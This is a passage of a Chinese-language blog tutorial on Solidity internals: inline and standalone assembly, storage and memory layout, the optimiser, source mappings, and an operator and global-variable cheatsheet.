class="keyword">let</span> y := add(sload(v), <span class="number">1</span>)</span><br><span class="line">                b := y</span><br><span class="line">            &#125; <span class="comment">// y is "deallocated" here</span></span><br><span class="line">            b := add(b, v)</span><br><span class="line">        &#125; <span class="comment">// v is "deallocated" here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将汇编的局部变量复制给函数的局部变量是可行的，需要注意的是，在将storage或memory类型的指针复制给变量时要格外小心，你只会修改指针而不会修改变量。<br>变量只能被赋予一个确切值，假如你要获得一个多返回值函数的返回值，那么你需要提供多个变量。  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    let v := 0</span><br><span class="line">    let g := add(v, 2)</span><br><span class="line">    function f() -&gt; a, b &#123; &#125;</span><br><span class="line">    let c, d := f()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;if语句条件执行，但是没有”else”的部分。如果你想提供多重选择，你可以考虑使用switch语句。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> eq(value, <span class="number">0</span>) &#123; revert(<span class="number">0</span>, <span class="number">0</span>) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>程序体需要大括号</p>
</blockquote>
<p>&emsp;&emsp;你可以使用switch语句来实现基本的”if/else”语句，你可以使用 <strong>default </strong>关键字来声明一个fallback或者默认选项。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">switch</span> calldataload(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> &#123;</span><br><span class="line">        x := calldataload(<span class="number">0x24</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span> &#123;</span><br><span class="line">        x := calldataload(<span class="number">0x44</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sstore(<span class="number">0</span>, div(x, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>switch块不需要大括号，但是每个case需要大括号。  </p>
</blockquote>
<p>&emsp;&emsp;汇编支持for风格的循环，他包含一个初始化部分，一个条件判断部分和一个迭代部分。条件判断部分必须使用函数风格，而另外两个部分则使用代码块，若初始化部分声明了某些变量，那么他们的作用与将延伸值循环体内(包括条件判断与迭代部分)。  </p>
<p>&emsp;&emsp;以下例子是计算一片内存的和：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> &#123; <span class="keyword">let</span> i := <span class="number">0</span> &#125; lt(i, <span class="number">0x100</span>) &#123; <span class="attr">i</span> := add(i, <span class="number">0x20</span>) &#125; &#123;</span><br><span class="line">        x := add(x, mload(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当然，你也可以用他来实现while风格：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> i := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> &#123; &#125; lt(i, <span class="number">0x100</span>) &#123; &#125; &#123;     <span class="comment">// while(i &lt; 0x100)</span></span><br><span class="line">        x := add(x, mload(i))</span><br><span class="line">        i := add(i, <span class="number">0x20</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;汇编也支持低级函数的定义，参数和返回地址来自栈，返回值也将布置到栈上，调用一个函数看起来像执行一段函数类型opcode。函数可以被定义在任意位置，其可视范围是所定义的代码块，在函数体内你不能访问外部的变量，而且函数没有显示的return语句。  </p>
<blockquote>
<p>如果你的函数有多个返回值，那么你需要将他们复制给一个元组(即多个变量)  </p>
</blockquote>
<p>&emsp;&emsp;下面的示例通过平方和乘法实现幂函数：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">power</span>(<span class="params">base, exponent</span>) -&gt; <span class="title">result</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> exponent</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="attr">result</span> := <span class="number">1</span> &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> &#123; <span class="attr">result</span> := base &#125;</span><br><span class="line">        <span class="keyword">default</span> &#123;</span><br><span class="line">            result := power(mul(base, base), div(exponent, <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">switch</span> mod(exponent, <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span> &#123; <span class="attr">result</span> := mul(base, result) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Solidity 中的转换(Conventions in Solidity)  </li>
</ul>
<p>&emsp;&emsp;与EVM汇编相比，Solidity有些类型不足256位，为了使计算更有效，EVM通常将他们以256为来对待，强行把它们放在一个slot内，而高阶位元只在必要时才会被清理，就在它们被写入内存或执行比较之前不久。所以如果你想要使用内联汇编来访问他们的话，你必须手动清零高位。<br>&emsp;&emsp;solidity以一种非常简单的方式管理内存：内存中的位置0x40处有一个“空闲内存指针”。如果要分配内存，只需使用从指针指向的位置开始的内存，并相应地更新它。但我们无法保证内存之前没有被使用过，所以你不能假设他的初始内容是0。没有内置的内存释放或回收机制，下面是一个内存分配的例子：    </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params">length</span>) -&gt; <span class="title">pos</span> </span>&#123;</span><br><span class="line">  pos := mload(<span class="number">0x40</span>)</span><br><span class="line">  mstore(<span class="number">0x40</span>, add(pos, length))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;前64个字节的内存可以用作短期分配的“临时空间”。储存空闲内存指针后的32个字节(即从0x60开始)应永久为零，并用作空动态内存数组的初始值。这意味着可分配内存从0x80开始，这是可用内存指针的初始值。    </p>
<p>&emsp;&emsp;solidity中memory数组中的元素总是占用32字节的倍数(是的，对于byte[]甚至是这样，但对于bytes和string则不是这样)。多维memory数组是指向memory数组的指针。动态数组的长度存储在数组的第一个solt(第一个32byte)中，然后是数组元素。  </p>
<blockquote>
<p>静态大小的memory数组没有长度字段，但日后可能会添加该字段，以便在静态大小的数组和动态大小的数组之间实现更好的可转换性，因此请不要依赖于此。  </p>
</blockquote>
<ul>
<li>独立汇编(Standalone Assembly)  </li>
</ul>
<p>&esmp;&emsp;独立汇编是区块链逆向的基础，我们直接来感受一下吧：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint y</span>) </span>&#123;</span><br><span class="line">    y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; x; i++)</span><br><span class="line">      y = <span class="number">2</span> * y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;对应汇编如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  mstore(0x40, 0x80)	 // 储存    &quot;空闲memory指针”</span><br><span class="line">  </span><br><span class="line">  // 函数调度器，注意这里的运行方式</span><br><span class="line">  switch div(calldataload(0), exp(2, 226))</span><br><span class="line">  case 0xb3de648b &#123;</span><br><span class="line">    let r := f(calldataload(4))</span><br><span class="line">    let ret := $allocate(0x20)</span><br><span class="line">    mstore(ret, r)</span><br><span class="line">    return(ret, 0x20)</span><br><span class="line">  &#125;</span><br><span class="line">  default &#123; revert(0, 0) &#125;</span><br><span class="line">  // 内存分配器</span><br><span class="line">  function $allocate(size) -&gt; pos &#123;</span><br><span class="line">    pos := mload(0x40)</span><br><span class="line">    mstore(0x40, add(pos, size))</span><br><span class="line">  &#125;</span><br><span class="line">  // 合约函数部分</span><br><span class="line">  function f(x) -&gt; y &#123;</span><br><span class="line">    y := 1</span><br><span class="line">    for &#123; let i := 0 &#125; lt(i, x) &#123; i := add(i, 1) &#125; &#123;</span><br><span class="line">      y := mul(2, y)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意</p>
<blockquote>
<p>函数的调度是通过一个16位字节码来实现的，即上例的switch/case部分，switch的操作就是将调用地址转化成一个16位字节码，若调用地址与某函数字节码对应，则调至该函数，这一步分在区块链逆向中十分常见。  </p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;关于汇编的语法我不想多将，其更重要的是EVM的运行机制，我们会在后面进行说明。</p>
<h3 id="4-杂项-Miscellaneous"><a href="#4-杂项-Miscellaneous" class="headerlink" title="4. 杂项(Miscellaneous)"></a>4. 杂项(Miscellaneous)</h3><ul>
<li>状态变量的内存布局  </li>
</ul>
<p>&emsp;&emsp;固定大小的变量(除了mapping和动态数组)都存储在从0开始的连续区域内，多个少于32字节的连续对象将按照一下规则被打包在一个slot内：  </p>
<ol>
<li>slot中的第一个对象是低阶对齐的  </li>
<li>基本类型只消耗存储他们所必须的字节</li>
<li>若slot中剩下的空间不足储存一个基本类型，那么他将被存储到下一个slot  </li>
<li>结构和数组总是占据一个新的slot并占据整个slot，但是其中的数据将符合这些规则  </li>
</ol>
<p>&emsp;&emsp;当使用的变量小于32字节时，你的合约将消耗更多的gas。因为EVM一次对32字节进行操作，因此如果变量小于32字节，EVM必须执行更多的指令，将元素从32字节减小到所需大小。<br>&emsp;&emsp;只有当处理storage类型的变量是减小参数的大小才是有益的，因为编译器将把多个元素打包到一个slot内，从而将多次读写结合在一个操作内。当处理函数参数或者memory类型的变量时，这并没有什么增益，因为编译器并不会将他们打包。<br>&emsp;&emsp;为了确保EVM能够对此优化，你应当保证storage类型的变量能够被紧密的打包，例如，声明storage变量<code>uint128, uint128, uint256</code>将会比<code>uint128, uint 256, uint128</code>更加有效，因为前者占用两个slot而后者占用三个。  </p>
<blockquote>
<p>struct和mapping中的元素将彼此紧挨着存在一起，就好像他们已经被显示的给定。</p>
</blockquote>
<ul>
<li>映射与动态数组(Mappings and Dynamic Arrays)  </li>
</ul>
<p>&emsp;&emsp;由于映射与动态数组大小的不可预测性，通常情况下使用keccak-256的hash来计算值的起始位置或者查找数组的值，这些起始位置总是占据一个slot。  </p>
<p>&emsp;&emsp;根据以上规则，映射与动态数组本身将在storage的p处占据一个slot。对于动态数组来说，这个slot(即数组指针的位置)将用来储存该数组的大小。对于映射来说，这个slot将是空的(但这是必要的，以便两个相等的映射具有不同的hash分布)。数组的数据将被出存在keccak256(p)处，而映射键k所对应的值p将出存在keccak256(k.p)处，若所对应的值仍为非基本类型，则其储存位置为keccak256(k.p)加一个偏移。  </p>
<p>&emsp;&emsp;例如以下合约片段：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">  struct s &#123; uint a; uint b; &#125;</span><br><span class="line">  uint x;</span><br><span class="line">  mapping(<span class="function"><span class="params">uint</span> =&gt;</span> mapping(<span class="function"><span class="params">uint</span> =&gt;</span> s)) data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>data[4][9].b的位置在 keccak256(uint256(9).keccak256(uint256(4).uint256(1))) + 1</p>
</blockquote>
<ul>
<li>二进制数组与字符串(Bytes and String)  </li>
</ul>
<p>&emsp;&emsp;bytes和string将会被完全相同地编码。对于 <code>short byte arrays</code> 长度和数据将会被出存在同一个slot内。特别地：如果数据最长为 31 bytes，    那么数据将会存储在高阶字节中(左对齐)，最低阶字节存储 <code>length * 2</code> 。对于存储32或更长字节的数组，主slot将存储 <code>length * 2  +1</code>,数据通常存储在 <code>keccak256(slot)</code> 中。这意味着你可以通过检查是否设置了低位来区分长数组与短数组：短数组(未设置) 长数组(设置)  </p>
<blockquote>
<p>处理非法编码的插槽目前并不支持，但日后可能会增加。  </p>
</blockquote>
<ul>
<li>内存布局(Layout in Memory)  </li>
</ul>
<p>&emsp;&emsp;solidity保留4个32-bytes的slot，具体范围与使用目的如下：  </p>
<ul>
<li><code>0x00</code> - <code>0x3f</code>(64字节)：哈希运算的草稿(scratch)空间，即临时空间  </li>
<li><code>0x40</code> - <code>0x5f</code>(32字节)：当前分配的内存大小(空闲内存指针)</li>
<li><code>0x60</code> - <code>0x7f</code>(32字节)：零插槽(Zero slot)  </li>
</ul>
<p>&emsp;&emsp;可以在语句之间使用Strach空间(即内联汇编)。零插槽用于给动态数组初始化，永远都不应被写入，因此空闲内存指针z最初指向 <code>0x80</code>。  </p>
<p>&emsp;&emsp;Solidity总是将新的对象放置于空闲内存指针上，并且内存将永远不会释放(这在以后可能会改变)。  </p>
<blockquote>
<p>Solidity中可能有一些操作会使用超出64字节的临时空间(Scratch)，他们将会被分配到空闲内存指针指向的位置，但是给予其较短的生命周期，而且指针本身不会更新，因此该内存可能为零也可能不为零。所以，我们不应当认为空闲内存是默认置零的。<br>看起来使用 <code>msize</code> 来获得一个确定的置零空闲内存是个不错的选择，然而，如果不更新此指针，将其作为非临时指针使用的话可能带来负面效果，原理同上。  </p>
<blockquote>
<p>注：<code>msize</code>的作用为获得当前最大可索引空间的大小，即空闲指针。  </p>
</blockquote>
</blockquote>
<ul>
<li>调用数据布局(Layout of Call Data)  </li>
</ul>
<p>&emsp;&emsp;函数调用时的数据将被假定为ABI规范定义的格式。其中，ABI规范要求将参数填充为32字节的倍数。Internal类型的函数调用使用不同的约定。  </p>
<p>&emsp;&emsp;合约构造函数的参数将会直接附加在合约代码的末尾，也使用ABI编码。构造函数将使用硬编码偏移量来访问他们，而非使用 <code>codesize</code> 的操作码，因为当数据附加到代码时，其将会发生改变。</p>
<ul>
<li>内部–清理变量(Internals-Cleaning Up Variables)  </li>
</ul>
<p>&emsp;&emsp;当一个值小于256位时，在某些情况下必须清空剩余的位。Solidity编译器将会在这些多余的垃圾位产生不利影响之前将其清空。例如，再将数据写入内存之前，剩余位需要被清空，因为这些位可能会造成数据紊乱。  </p>
<p>&emsp;&emsp;另一方面，如果后续操作不受影响，我们将不会立即清理位。例如，由于 <code>Jumpi</code> 指令认为任何非零值都为真，因此在讲布尔值用作Jumpi条件之前我们不会清空这些值。  </p>
<p>&emsp;&emsp;除了以上设计原则之外，Solidity编译器将在数据加载到堆栈上时清空输入数据。不同数据的类型具有不同的清空规则：  </p>
<table>
<thead>
<tr>
<th style="text-align:left">类型(Type)</th>
<th style="text-align:center">有效值</th>
<th style="text-align:left">无效值导致的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">n个成员的枚举</td>
<td style="text-align:center">0到n-1</td>
<td style="text-align:left">异常</td>
</tr>
<tr>
<td style="text-align:left">布尔</td>
<td style="text-align:center">0或1</td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td style="text-align:left">有符号整数</td>
<td style="text-align:center">符号扩展字</td>
<td style="text-align:left">目前会直接打包；将来会抛出异常</td>
</tr>
<tr>
<td style="text-align:left">无符号整数</td>
<td style="text-align:center">高位补0</td>
<td style="text-align:left">目前会直接打包；将来会抛出异常</td>
</tr>
</tbody>
</table>
<ul>
<li>内部优化(Internals-The Optimiser)  </li>
</ul>
<p>&emsp;&emsp;Solidity 优化器是在汇编语言级别工作的，所以它可以并且也被其他语言所使用。它通过 <code>JUMP</code> 和 <code>JUMPDEST</code> 语句将指令集序列分割为基础的代码块。在这些代码块内的指令集会被分析，并且对堆栈、内存或存储的每个修改都会被记录为表达式，这些表达式由一个指令和基本上是指向其他表达式的参数列表所组成。这个优化器使用一个叫做“CommonSubexpressionEliminator”的组件lai，在其他任务中，找到恒等的表达式，并将它们组合到一个表达式类中，优化器将将首先尝试在已知表达式中查询新的表达式。如果没有找到，表达式将会按照 <code>constant + constant = sum_of_constants</code> 或者 <code>x * 1 = x</code> 的规则进行简化。由于这是一个递归的执行过程，因此，如果我们知道一个复杂的表达式恒等于1时，我们可以应用第二条规则。对于storage和memory具体位置的修改必须删除有关storage与memory位置的认知(Knowledge)，这里的区别我们并不清楚：假如我们先在x位置写入，然后在y位置写入，并且两者都是输入变量，那么第二个变量将会覆盖第一个，因此在y写入后我们并不知道x中储存了什么。如果表达式 <code>x-y</code> 的简化结果为非零常量，那么我们知道我们可以保持对x中存储内容的认知。  </p>
<p>&emsp;&emsp;在这个过程之后，我们知道哪些表达式必须在栈的末尾，并有一个对内存和存储的修改列表。这些信息与基本块一起存储，并用于链接它们。此外，有关堆栈、存储和内存配置的知识将转发到下一个块。如果我们知道所有 <code>JUMP</code> 和 <code>JUMPI</code>的目标，我们就可以建立一个完整的程序控制流程图。如果只有一个我们不知道的目标(原则上这可以发生，跳跃目标可以从输入中计算)，我们必须清除有关块输入状态的所有认知，因为它可能是未知跳跃的目标。如果优化器找到一个条件值为常量的 <code>Jumpi</code>，它会将其转换为无条件的 <code>Jumpi</code>。  </p>
<p>&emsp;&emsp;最后一步是重新生成每个块中的代码。优化器从块末尾堆栈上的表达式创建依赖关系图，并删除不属于此图的每个操作。它生成的代码按照原始代码的顺序将修改应用于内存和存储(删除发现不需要的修改)。最后，它生成所有需要在堆栈上正确位置的值。  </p>
<p>&emsp;&emsp;这些步骤应用于每个基本块，如果新生成的代码较小，则将其用作替换代码。如果在 <code>Jumpi</code> 处拆分基本块，并且在分析过程中，条件评估为常量，则根据常量的值替换 <code>Jumpi</code>。例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint x = <span class="number">7</span>;</span><br><span class="line">data[<span class="number">7</span>] = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">if</span> (data[x] != x + <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>简化后：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">7</span>] = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>源码映射(Source Mappings)  </li>
</ul>
<p>&emsp;&emsp;作为AST输出的一部分，编译器提供由AST中的各个节点表示的源代码范围。这可以用于各种用途，从基于AST报告错误的静态分析工具，到突出显示局部变量及其用途的调试工具。  </p>
<p>&emsp;&emsp;此外，编译器还可以生成从字节码到生成指令的源代码范围的映射。这对于在字节码级别上操作的静态分析工具以及在调试器内显示源代码中的当前位置或处理断点来说十分重要。  </p>
<p>&emsp;&emsp;这两种源映射都使用整数标识符来引用源文件。源文件的标识符存储在输出[‘sources’][sourcename][‘id’]中，其中output是解析为JSON的标准JSON编译器接口的输出。  </p>
<blockquote>
<p>对于不与任何特定源文件关联的指令，源映射将分配一个-1的整数标识符。对于源自编译器生成的内联汇编语句的字节码部分，可能会发生这种情况。  </p>
</blockquote>
<p>AST内的源映射使用以下表示法：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:l:f</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中s是到源文件中范围开头的字节偏移量，l是源范围的长度（以字节为单位），f是上面提到的源索引。   </p>
<p>&emsp;&emsp;字节码的源映射中的编码更加复杂：它是由 <code>;</code> 分隔的 <code>s:l:f:j</code> 列表。这些元素中的每一个都对应于一条指令，即不能使用字节偏移量，但必须使用指令偏移量（推送指令比单个字节长）。字段 <code>s</code> ,<code>l</code> 和f如上所述，<code>j</code>可以是 <code>i</code> ,<code>o</code> 或 <code>-</code> 表示跳转指令是进入函数、从函数返回还是作为循环的一部分的常规跳转。</p>
<p>为了压缩这些源映射，尤其是字节码映射，使用以下规则：  </p>
<ul>
<li><p>如果字段为空，则使用前面元素的值。  </p>
</li>
<li><p>如果缺少a:，则以下所有字段都视为空。  </p>
</li>
</ul>
<p>这意味着以下源映射表示相同的信息：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:2:1;1:9:1;2:1:2;2:1:2;2:1:2</span><br><span class="line"></span><br><span class="line">1:2:1;:9;2:1:2;;</span><br></pre></td></tr></table></figure>
<ul>
<li>技巧与窍门(Tips and Tricks)  </li>
</ul>
<ul>
<li><p>对数组使用 <code>delete</code> 来清空其所有元素</p>
</li>
<li><p>对struct中的元素使用较短的数据类型，并且对他们排序，以便将较短的类型打包在一个slot中来消耗更少的gas  </p>
</li>
<li><p>确保state变量为public类型，编译器将为你自动生成一个getter  </p>
</li>
<li><p>如果你最终需要在函数开始位置检查很多输入条件或者状态变量的值，你可以尝试使用装饰器(Modifier)  </p>
</li>
<li><p>如果你的合约有一个 <code>send</code> 函数，但你想要使用内置的 send 函数，你可以使用 <code>address(contractVariable).send(amount)</code>  </p>
</li>
<li><p>使用一个赋值语句就可以初始化 struct：x = MyStruct({a: 1, b: 2});  </p>
</li>
</ul>
<blockquote>
<p>如果存储结构具有紧密打包(Tightly packed)的属性，请使用单独的赋值对其进行初始化：<code>x.a=1;x.b=2;</code>。这样，优化器一次更新存储将更容易，从而使分配开销更小。  </p>
</blockquote>
<ul>
<li>速查表(Cheatsheet)  </li>
</ul>
<p>&emsp;&emsp;运算符顺序优先级排序，以下是按计算顺序列出的运算符的优先顺序。  </p>
<table>
<thead>
<tr>
<th style="text-align:left">优先</th>
<th style="text-align:center">描述</th>
<th style="text-align:left">算符</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">后置自增和自减</td>
<td style="text-align:left"><code>++，--</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">创建类型实例</td>
<td style="text-align:left"><code>new &lt;typename&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">数组元素</td>
<td style="text-align:left"><code>&lt;array&gt;[&lt;index&gt;]</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">访问成员</td>
<td style="text-align:left"><code>&lt;object&gt;.&lt;member&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">函数调用</td>
<td style="text-align:left"><code>&lt;func&gt;(&lt;args...&gt;)</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">小括号</td>
<td style="text-align:left"><code>(&lt;statement&gt;)</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">前置自增和自减</td>
<td style="text-align:left"><code>++, --</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">一元运算的加和减</td>
<td style="text-align:left"><code>+,-</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">一元操作符</td>
<td style="text-align:left"><code>delete</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">逻辑非</td>
<td style="text-align:left"><code>!</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">按位非</td>
<td style="text-align:left"><code>~</code></td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:center">乘方</td>
<td style="text-align:left"><code>**</code></td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:center">乘、除和模运算</td>
<td style="text-align:left"><code>*, /, %</code></td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:center">算术加和减</td>
<td style="text-align:left"><code>+, -</code></td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:center">移位操作符</td>
<td style="text-align:left"><code>&lt;&lt;, &gt;&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:center">按位与</td>
<td style="text-align:left"><code>&amp;</code></td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:center">按位异或</td>
<td style="text-align:left"><code>^</code></td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:center">按位或</td>
<td style="text-align:left">`</td>
<td>`</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:center">非等操作符</td>
<td style="text-align:left"><code>&lt;, &gt;, &lt;=, &gt;=</code></td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:center">等于操作符</td>
<td style="text-align:left"><code>==, !=</code></td>
</tr>
<tr>
<td style="text-align:left">12</td>
<td style="text-align:center">逻辑与</td>
<td style="text-align:left"><code>&amp;&amp;</code></td>
</tr>
<tr>
<td style="text-align:left">13</td>
<td style="text-align:center">逻辑或</td>
<td style="text-align:left">`</td>
<td></td>
<td>`</td>
</tr>
<tr>
<td style="text-align:left">14</td>
<td style="text-align:center">三元操作符</td>
<td style="text-align:left"><code>&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">15</td>
<td style="text-align:center">赋值操作符</td>
<td style="text-align:left">`=,</td>
<td>=, ^=,&amp;=, &lt;&lt;=, &gt;&gt;=, +=, -=, *=, /=, %=`</td>
</tr>
<tr>
<td style="text-align:left">16</td>
<td style="text-align:center">逗号</td>
<td style="text-align:left"><code>,</code></td>
</tr>
</tbody>
</table>
<ul>
<li>全局变量(Global Variables)  </li>
</ul>
<ul>
<li><code>abi.encode(...) returns (bytes)</code>： ABI - 对给定参数进行编码</li>
<li><code>abi.encodePacked(...) returns (bytes)</code>：对给定参数执行 紧打包编码</li>
<li><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>： ABI - 对给定参数进行编码，并以给定的函数选择器作为起始的 4 字节数据一起返回</li>
<li><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>：等价于 <code>abi.encodeWithSelector(bytes4(keccak256(signature), ...)</code></li>
<li><code>block.blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 <code>blockhash(uint blockNumber)</code>代替</li>
<li><code>block.coinbase （address）</code>：挖出当前区块的矿工的地址</li>
<li><code>lock.difficulty （uint）</code>：当前区块的难度值</li>
<li><code>block.gaslimit （uint）</code>：当前区块的 gas 上限</li>
